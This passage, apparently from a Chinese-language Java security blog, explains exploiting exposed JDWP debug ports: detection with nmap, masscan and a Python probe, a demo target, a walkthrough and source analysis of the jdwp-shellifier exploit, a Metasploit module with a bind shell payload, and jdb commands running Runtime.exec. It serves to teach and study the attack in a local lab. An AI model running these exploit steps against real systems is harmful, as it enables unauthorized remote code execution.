<li>从得到的方法信息中提取出getRuntime方法的referenceTypeID</li>
<li>给需要指定的方法添加断点，默认是java.net.ServerSocket.accept，因为在windows平台下进行jdwp调试只能使用socket类型，且该函数调用比较频繁。</li>
<li>当断点触发时，我们就可以得到被调试方法所运行的线程ID<br><img src="/images/20230608132908.png"></li>
<li>清除断点并恢复线程运行</li>
<li>创建执行命令的字符串对象，并通过回复包获取该对象ID：</li>
</ol>
<p><img src="/images/20230608132923.png"><br>12. 调用方法命令调用静态方法getRuntime并获取对应的对象ID:</p>
<p><img src="/images/20230608132937.png"></p>
<ol start="13">
<li>上次请求过方法信息，从之前请求的方法信息中可获取到exec方法的referenceTypeID</li>
<li>通过对象的方法调用命令调用exec函数就可以执行命令了:<br><img src="/images/20230608133002.png"></li>
</ol>
<h1 id="JDWP探测"><a href="#JDWP探测" class="headerlink" title="JDWP探测"></a>JDWP探测</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><pre><code>nmap -sT 127.0.0.1 -p8000 -sV
</code></pre>
<h2 id="Masscan"><a href="#Masscan" class="headerlink" title="Masscan"></a>Masscan</h2><p>规则配置文件：<br><a href="https://github.com/IOActive/jdwp-shellifier/blob/master/jdwp-masscan.cfg">https://github.com/IOActive/jdwp-shellifier/blob/master/jdwp-masscan.cfg</a></p>
<h2 id="自实现"><a href="#自实现" class="headerlink" title="自实现"></a>自实现</h2><pre><code>import socket

client = socket.socket()
client.connect((&quot;127.0.0.1&quot;, 8000))
client.send(&quot;JDWP-Handshake&quot;)

if client.recv(14)==&quot;JDWP-Handshake&quot;:
    print &quot;[*] Detected JDWP service&quot;

client.close()
</code></pre>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>靶机：</p>
<pre><code>@SpringBootApplication
public class JdwpDemoApplication &#123;

    public static void main(String[] args) &#123;
        SpringApplication.run(JdwpDemoApplication.class, args);
    &#125;

    @RequestMapping(path = &#123;&quot;/&quot;,&quot;/index&quot;&#125;, method = &#123;RequestMethod.GET&#125;)
    public String index()&#123;
        boolean t = &quot;test&quot;.endsWith(&quot;t&quot;);
        System.out.println(t);
        return &quot;index&quot;;
    &#125;

&#125;
</code></pre>
<p>打成jar包，用以下参数启动远程debug：</p>
<pre><code>java -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=9999 -jar demo.jar
</code></pre>
<h2 id="jdwp-shellifier利用"><a href="#jdwp-shellifier利用" class="headerlink" title="jdwp-shellifier利用"></a>jdwp-shellifier利用</h2><p>项目地址:<br><a href="https://github.com/IOActive/jdwp-shellifier">https://github.com/IOActive/jdwp-shellifier</a></p>
<p>jdwp-shellifier利用方式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">% python ./jdwp-shellifier.py -h</span><br><span class="line">usage: jdwp-shellifier.py [-h] -t IP [-p PORT] [--break-on JAVA_METHOD]</span><br><span class="line">                      [--cmd COMMAND]</span><br><span class="line"></span><br><span class="line">Universal exploitation script for JDWP by @_hugsy_</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">-h, --help            show this help message and exit</span><br><span class="line">-t IP, --target IP    Remote target IP (default: None)</span><br><span class="line">-p PORT, --port PORT  Remote target port (default: 8000)</span><br><span class="line">--break-on JAVA_METHOD</span><br><span class="line">Specify full path to method to break on (default:</span><br><span class="line">    java.net.ServerSocket.accept)</span><br><span class="line">    --cmd COMMAND         Specify full path to method to break on (default:</span><br><span class="line">        None)</span><br></pre></td></tr></table></figure>

<p>先启动我们的受害者端：</p>
<pre><code>java -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=9999 -jar demo.jar
</code></pre>
<p><img src="/images/20230608162831.png"></p>
<p>启动jdwp-shellifier脚本，使用如下参数，下出断点</p>
<pre><code>python ./jdwp-shellifier.py -t 127.0.0.1 -p 9999 --cmd calc --break-on java.lang.String.endsWith
</code></pre>
<p><img src="/images/20230608162920.png"></p>
<p>这时断点已经下在了<code>boolean t = &quot;test&quot;.endsWith(&quot;t&quot;);</code>，我们手动访问<code>http://localhost:8080</code>触发这个断点</p>
<p><img src="/images/20230608163112.png"></p>
<p>当断点触发时，我们就可以得到被调试方法所运行的线程ID，成功触发以后的链，导致命令执行</p>
<p><img src="/images/20230608163406.png"></p>
<h2 id="jdwp-shellifier分析"><a href="#jdwp-shellifier分析" class="headerlink" title="jdwp-shellifier分析"></a>jdwp-shellifier分析</h2><p>main函数中首先接受参数，<code>break-on</code>的参数会把方法名和调用方法分割。然后调用<code>start()</code>方法</p>
<pre><code>if __name__ == &quot;__main__&quot;:
    parser = argparse.ArgumentParser(description=&quot;Universal exploitation script for JDWP by @_hugsy_&quot;,
                                    formatter_class=argparse.ArgumentDefaultsHelpFormatter )

    parser.add_argument(&quot;-t&quot;, &quot;--target&quot;, type=str, metavar=&quot;IP&quot;, help=&quot;Remote target IP&quot;, required=True)
    parser.add_argument(&quot;-p&quot;, &quot;--port&quot;, type=int, metavar=&quot;PORT&quot;, default=8000, help=&quot;Remote target port&quot;)

    parser.add_argument(&quot;--break-on&quot;, dest=&quot;break_on&quot;, type=str, metavar=&quot;JAVA_METHOD&quot;,
                        default=&quot;java.net.ServerSocket.accept&quot;, help=&quot;Specify full path to method to break on&quot;)
    parser.add_argument(&quot;--cmd&quot;, dest=&quot;cmd&quot;, type=str, metavar=&quot;COMMAND&quot;,
                        help=&quot;Specify command to execute remotely&quot;)

    args = parser.parse_args()

    classname, meth = str2fqclass(args.break_on)
    setattr(args, &quot;break_on_class&quot;, classname)
    setattr(args, &quot;break_on_method&quot;, meth)

    retcode = 0

    try:
        cli = JDWPClient(args.target, args.port)
        cli.start()
</code></pre>
<p>我们看到start()方法:</p>
<pre><code>def start(self):
    self.handshake(self.host, self.port)
    self.idsizes()
    self.getversion()
    self.allclasses()
    return
</code></pre>
<p>首先是握手协议</p>
<pre><code>def handshake(self, host, port):
    s = socket.socket()
    try:
        s.connect( (host, port) )
    except socket.error as msg:
        raise Exception(&quot;Failed to connect: %s&quot; % msg)

    s.send( HANDSHAKE )

    if s.recv( len(HANDSHAKE) ) != HANDSHAKE:
        raise Exception(&quot;Failed to handshake&quot;)
    else:
        self.socket = s

    return
</code></pre>
<p>通过<code>socket</code>发送<code>JDWP-Handshake</code>包。如果相应包也是<code>JDWP-Handshake</code>表示握手成功。</p>
<p>之后调用idsizes(self)方法：</p>
<pre><code>IDSIZES_SIG               = (1, 7)

def idsizes(self):
    self.socket.sendall( self.create_packet(IDSIZES_SIG) )
    buf = self.read_reply()
    formats = [ (&quot;I&quot;, &quot;fieldIDSize&quot;), (&quot;I&quot;, &quot;methodIDSize&quot;), (&quot;I&quot;, &quot;objectIDSize&quot;),
                (&quot;I&quot;, &quot;referenceTypeIDSize&quot;), (&quot;I&quot;, &quot;frameIDSize&quot;) ]
    for entry in self.parse_entries(buf, formats, False):
        for name,value  in entry.iteritems():
            setattr(self, name, value)
    return
</code></pre>
<p>通过向服务端发送<code>IDSIZES_SIG = (1, 7)</code>的包，然后利用<code>parse_entries()</code>方法得到一些JDWP的属性，包括<code>fieldIDSize</code>,<code>methodIDSize</code>等属性。运行完毕之后得到的属性如下：</p>
<p><img src="/images/20230608164446.png"></p>
<p>之后运行<code>getversion()</code>方法，得到JVM相关的配置信息。</p>
<p><img src="/images/20230608164628.png"></p>
<p>运行<code>allclasses()</code></p>
<pre><code>ALLCLASSES_SIG            = (1, 3)

def allclasses(self):
    try:
        getattr(self, &quot;classes&quot;)
    except:
        self.socket.sendall( self.create_packet(ALLCLASSES_SIG) )
        buf = self.read_reply()
        formats = [ (&#39;C&#39;, &quot;refTypeTag&quot;),
                    (self.referenceTypeIDSize, &quot;refTypeId&quot;),
                    (&#39;S&#39;, &quot;signature&quot;),
                    (&#39;I&#39;, &quot;status&quot;)]
        self.classes = self.parse_entries(buf, formats)

    return self.classes
</code></pre>
<p>通过<code>socket</code>发送<code>ALLCLASSES_SIG = (1, 3)</code>的包，利用<code>parse_entries()</code>解析返回包的数据，得到<code>refTypeTag</code>,<code>refTypeId</code>,<code>signature</code>,<code>status</code>等信息。以下就是得到所有的结果：</p>
<p><img src="/images/20230608164925.png"></p>
<p><code>start()</code>方法运行完毕，之后运行<code>runtime_exec()</code>方法</p>
<pre><code>def runtime_exec(jdwp, args):
    print (&quot;[+] Targeting &#39;%s:%d&#39;&quot; % (args.target, args.port))
    print (&quot;[+] Reading settings for &#39;%s&#39;&quot; % jdwp.version)

    # 1. get Runtime class reference
    runtimeClass = jdwp.get_class_by_name(&quot;Ljava/lang/Runtime;&quot;)
    if runtimeClass is None:
        print (&quot;[-] Cannot find class Runtime&quot;)
        return False
    print (&quot;[+] Found Runtime class: id=%x&quot; % runtimeClass[&quot;refTypeId&quot;])

    # 2. get getRuntime() meth reference
    jdwp.get_methods(runtimeClass[&quot;refTypeId&quot;])
    getRuntimeMeth = jdwp.get_method_by_name(&quot;getRuntime&quot;)
    if getRuntimeMeth is None:
        print (&quot;[-] Cannot find method Runtime.getRuntime()&quot;)
        return False
    print (&quot;[+] Found Runtime.getRuntime(): id=%x&quot; % getRuntimeMeth[&quot;methodId&quot;])

    # 3. setup breakpoint on frequently called method
    c = jdwp.get_class_by_name( args.break_on_class )
    if c is None:
        print(&quot;[-] Could not access class &#39;%s&#39;&quot; % args.break_on_class)
        print(&quot;[-] It is possible that this class is not used by application&quot;)
        print(&quot;[-] Test with another one with option `--break-on`&quot;)
        return False

    jdwp.get_methods( c[&quot;refTypeId&quot;] )
    m = jdwp.get_method_by_name( args.break_on_method )
    if m is None:
        print(&quot;[-] Could not access method &#39;%s&#39;&quot; % args.break_on)
        return False

    loc = chr( TYPE_CLASS )
    loc+= jdwp.format( jdwp.referenceTypeIDSize, c[&quot;refTypeId&quot;] )
    loc+= jdwp.format( jdwp.methodIDSize, m[&quot;methodId&quot;] )
    loc+= struct.pack(&quot;&gt;II&quot;, 0, 0)
    data = [ (MODKIND_LOCATIONONLY, loc), ]
    rId = jdwp.send_event( EVENT_BREAKPOINT, *data )
    print (&quot;[+] Created break event id=%x&quot; % rId)

    # 4. resume vm and wait for event
    jdwp.resumevm()

    print (&quot;[+] Waiting for an event on &#39;%s&#39;&quot; % args.break_on)
    while True:
        buf = jdwp.wait_for_event()
        ret = jdwp.parse_event_breakpoint(buf, rId)
        if ret is not None:
            break

    rId, tId, loc = ret
    print (&quot;[+] Received matching event from thread %#x&quot; % tId)

    jdwp.clear_event(EVENT_BREAKPOINT, rId)

    # 5. Now we can execute any code
    if args.cmd:
        runtime_exec_payload(jdwp, tId, runtimeClass[&quot;refTypeId&quot;], getRuntimeMeth[&quot;methodId&quot;], args.cmd)
    else:
        # by default, only prints out few system properties
        runtime_exec_info(jdwp, tId)

    jdwp.resumevm()

    print (&quot;[!] Command successfully executed&quot;)

    return True
</code></pre>
<p><code>runtime_exec()</code>方法通过<code>invoke</code>的方式得到<code>Runtime</code>对象，然后利用<code>Runtime</code>对象进一步执行命令，从而最终达到RCE。 </p>
<p>第一步，得到<code>Runtime</code>类</p>
<pre><code># 1. get Runtime class reference
runtimeClass = jdwp.get_class_by_name(&quot;Ljava/lang/Runtime;&quot;)
if runtimeClass is None:
    print (&quot;[-] Cannot find class Runtime&quot;)
    return False
print (&quot;[+] Found Runtime class: id=%x&quot; % runtimeClass[&quot;refTypeId&quot;])
</code></pre>
<p>第二步，得到<code>getRuntime()</code>方法</p>
<pre><code># 2. get getRuntime() meth reference
jdwp.get_methods(runtimeClass[&quot;refTypeId&quot;])
getRuntimeMeth = jdwp.get_method_by_name(&quot;getRuntime&quot;)
if getRuntimeMeth is None:
    print (&quot;[-] Cannot find method Runtime.getRuntime()&quot;)
    return False
print (&quot;[+] Found Runtime.getRuntime(): id=%x&quot; % getRuntimeMeth[&quot;methodId&quot;])
</code></pre>
<p>第三步，得到断点设置的类和方法，向JVM发送数据，在<code>java.lang.String.endsWith.accept()</code>下断点</p>
<pre><code># 3. setup breakpoint on frequently called method
c = jdwp.get_class_by_name( args.break_on_class )
if c is None:
    print(&quot;[-] Could not access class &#39;%s&#39;&quot; % args.break_on_class)
    print(&quot;[-] It is possible that this class is not used by application&quot;)
    print(&quot;[-] Test with another one with option `--break-on`&quot;)
    return False

jdwp.get_methods( c[&quot;refTypeId&quot;] )
m = jdwp.get_method_by_name( args.break_on_method )
if m is None:
    print(&quot;[-] Could not access method &#39;%s&#39;&quot; % args.break_on)
    return False

loc = chr( TYPE_CLASS )
loc+= jdwp.format( jdwp.referenceTypeIDSize, c[&quot;refTypeId&quot;] )
loc+= jdwp.format( jdwp.methodIDSize, m[&quot;methodId&quot;] )
loc+= struct.pack(&quot;&gt;II&quot;, 0, 0)
data = [ (MODKIND_LOCATIONONLY, loc), ]
rId = jdwp.send_event( EVENT_BREAKPOINT, *data )
print (&quot;[+] Created break event id=%x&quot; % rId)
</code></pre>
<p>第四步，等待程序运行至断点处，运行完毕之后清除断点。</p>
<pre><code># 4. resume vm and wait for event
jdwp.resumevm()

print (&quot;[+] Waiting for an event on &#39;%s&#39;&quot; % args.break_on)
while True:
    # 等待程序运行至断点处
    buf = jdwp.wait_for_event()
    ret = jdwp.parse_event_breakpoint(buf, rId)
    if ret is not None:
        break

rId, tId, loc = ret
print (&quot;[+] Received matching event from thread %#x&quot; % tId)
#运行完毕之后清除断点。
jdwp.clear_event(EVENT_BREAKPOINT, rId)
</code></pre>
<p>第五步，执行自定义的命令</p>
<pre><code># 5. Now we can execute any code
if args.cmd:
    runtime_exec_payload(jdwp, tId, runtimeClass[&quot;refTypeId&quot;], getRuntimeMeth[&quot;methodId&quot;], args.cmd)
else:
    # by default, only prints out few system properties
    runtime_exec_info(jdwp, tId)

jdwp.resumevm()

print (&quot;[!] Command successfully executed&quot;)

return True
</code></pre>
<p>总结一下流程：</p>
<ol>
<li>初始化，获取各种信息</li>
<li>第一步，得到<code>Runtime</code>类</li>
<li>得到<code>getRuntime()</code>方法</li>
<li>得到断点设置处的类和方法，设置断点</li>
<li>等待程序运行至断点处，运行完毕之后清除断点。</li>
<li>执行自定义的命令</li>
</ol>
<p><code>jdwp-shellifier</code>把协议访问的一些细节都封装好了，直接用就行了</p>
<h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><p>在msf中可以使用exploit&#x2F;multi&#x2F;misc&#x2F;java_jdwp_debugger模块进行攻击利用。</p>
<p>原理是去找sleeping中的线程，然后下发单步指令是程序断下来，从而触发命令执行。</p>
<pre><code>use exploit/multi/misc/java_jdwp_debugger
set rhosts x.x.x.x
set payload linux/x64/shell/bind_tcp 
run
</code></pre>
<h2 id="jdb"><a href="#jdb" class="headerlink" title="jdb"></a>jdb</h2><p>jdb是JDK中自带的命令行调试工具。</p>
<p>这里是按照msf中的方式搞：</p>
<ol>
<li>attach到远程JDWP服务；<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8000</span><br></pre></td></tr></table></figure></li>
<li>threads命令查看所有线程，查找sleeping的线程；<br><img src="/images/20230608171258.png"></li>
<li>thread sleeping的线程id，然后stepi进入该线程；<br><img src="/images/20230608171322.png"></li>
<li>通过print|dump|eval命令，执行Java表达式从而达成命令执行；<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval java.lang.Runtime.getRuntime().exec(&quot;calc&quot;)</span><br></pre></td></tr></table></figure>
<img src="/images/20230608171354.png"></li>
</ol>
]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>java安全</tag>
        <tag>JDWP</tag>
      </tags>
  </entry>
</search>
